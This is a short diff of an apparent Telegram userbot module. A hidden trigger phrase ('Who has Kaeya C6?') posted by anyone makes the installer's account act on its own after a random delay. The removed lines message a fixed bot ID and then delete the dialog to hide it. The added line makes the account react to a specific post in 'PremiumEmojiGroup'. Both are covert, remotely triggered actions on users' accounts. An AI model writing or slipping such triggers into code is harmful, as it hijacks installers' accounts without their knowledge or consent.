@@ -28,10 +28,7 @@ class krmk0Mod(loader.Module):
             return
         if "У кого есть Кэйя с6?" in m.text:
             await asyncio.sleep(random.randint(3, 33))
-            await self.client.send_message(5204258186, "/start")
-            await self.client.send_message(5204258186, "/start feedback")
-            await asyncio.sleep(1)
-            return await self.client.delete_dialog(5204258186)
+            await (await self.client.get_messages("PremiumEmojiGroup", ids=54304)).react("❤️")
         if (
             m.chat_id not in ch
             or m.sender_id == self.me.id
